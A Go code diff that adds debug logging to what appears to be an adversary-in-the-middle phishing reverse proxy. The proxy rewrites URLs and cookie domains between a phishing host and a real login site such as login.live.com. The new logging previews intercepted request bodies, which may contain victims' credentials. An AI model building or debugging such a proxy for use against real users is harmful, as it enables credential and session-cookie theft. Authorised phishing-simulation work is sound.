@@ -715,9 +715,22 @@ func (m *ProxyHandler) patchQueryParametersWithContext(req *http.Request, reqCtx
 		return
 	}
 
+	m.logger.Debugw("patchQueryParametersWithContext: patching query params",
+		"url", req.URL.String(),
+		"configMapSize", len(reqCtx.ConfigMap),
+	)
+
 	for param := range qs {
 		for i, value := range qs[param] {
+			original := value
 			qs[param][i] = string(m.patchUrls(reqCtx.ConfigMap, []byte(value), CONVERT_TO_ORIGINAL_URLS))
+			if original != qs[param][i] {
+				m.logger.Infow("patchQueryParametersWithContext: param modified",
+					"param", param,
+					"original", original,
+					"patched", qs[param][i],
+				)
+			}
 		}
 	}
 	req.URL.RawQuery = qs.Encode()
@@ -725,6 +738,7 @@ func (m *ProxyHandler) patchQueryParametersWithContext(req *http.Request, reqCtx
 
 func (m *ProxyHandler) patchRequestBodyWithContext(req *http.Request, reqCtx *RequestContext) {
 	if req.Body == nil {
+		m.logger.Debugw("patchRequestBodyWithContext: body is nil, skipping")
 		return
 	}
 
@@ -735,7 +749,36 @@ func (m *ProxyHandler) patchRequestBodyWithContext(req *http.Request, reqCtx *Re
 	}
 	req.Body.Close()
 
+	originalBody := string(body)
+	m.logger.Debugw("patchRequestBodyWithContext: before patching",
+		"bodyLength", len(body),
+		"configMapSize", len(reqCtx.ConfigMap),
+		"phishDomain", reqCtx.PhishDomain,
+		"targetDomain", reqCtx.TargetDomain,
+		"bodyPreview", func() string { if len(originalBody) > 500 { return originalBody[:500] }; return originalBody }(),
+	)
+
+	// Log ConfigMap contents
+	for k, v := range reqCtx.ConfigMap {
+		m.logger.Debugw("patchRequestBodyWithContext: configMap entry",
+			"originalHost", k,
+			"phishHost", v.To,
+		)
+	}
+
 	body = m.patchUrls(reqCtx.ConfigMap, body, CONVERT_TO_ORIGINAL_URLS)
+
+	patchedBody := string(body)
+	if originalBody != patchedBody {
+		m.logger.Infow("patchRequestBodyWithContext: body was modified",
+			"patchedPreview", func() string { if len(patchedBody) > 500 { return patchedBody[:500] }; return patchedBody }(),
+		)
+	} else {
+		m.logger.Warnw("patchRequestBodyWithContext: body was NOT modified - no proxy domains found or config empty",
+			"bodyPreview", func() string { if len(originalBody) > 200 { return originalBody[:200] }; return originalBody }(),
+		)
+	}
+
 	req.Body = io.NopCloser(bytes.NewBuffer(body))
 	req.ContentLength = int64(len(body))
 }
@@ -2991,12 +3034,24 @@ func (m *ProxyHandler) rewriteCookieDomain(ck *http.Cookie, config map[string]se
 	cleanDomain := strings.TrimPrefix(cDomain, ".")
 	hasDot := strings.HasPrefix(cDomain, ".")
 
+	m.logger.Debugw("rewriteCookieDomain: processing cookie",
+		"cookieName", ck.Name,
+		"originalDomain", ck.Domain,
+		"cleanDomain", cleanDomain,
+		"configSize", len(config),
+	)
+
 	if phishHost := m.replaceHostWithPhished(cleanDomain, config); phishHost != "" {
 		if hasDot {
 			ck.Domain = "." + phishHost
 		} else {
 			ck.Domain = phishHost
 		}
+		m.logger.Infow("rewriteCookieDomain: exact match found",
+			"cookieName", ck.Name,
+			"from", cleanDomain,
+			"to", ck.Domain,
+		)
 		return
 	}
 
@@ -3014,6 +3069,12 @@ func (m *ProxyHandler) rewriteCookieDomain(ck *http.Cookie, config map[string]se
 		// Check if the cookie domain is a parent/suffix of the original host
 		// e.g., cleanDomain="live.com", originalHost="login.live.com"
 		if strings.HasSuffix(strings.ToLower(originalHost), "."+strings.ToLower(cleanDomain)) {
+			m.logger.Infow("rewriteCookieDomain: parent domain inference match",
+				"cookieName", ck.Name,
+				"cookieDomain", cleanDomain,
+				"originalHost", originalHost,
+				"phishHost", hostConfig.To,
+			)
 			// Found: originalHost is a subdomain of the cookie domain
 			// The phish equivalent: strip the subdomain prefix from the phish host
 			// originalHost = "login.live.com", cleanDomain = "live.com"
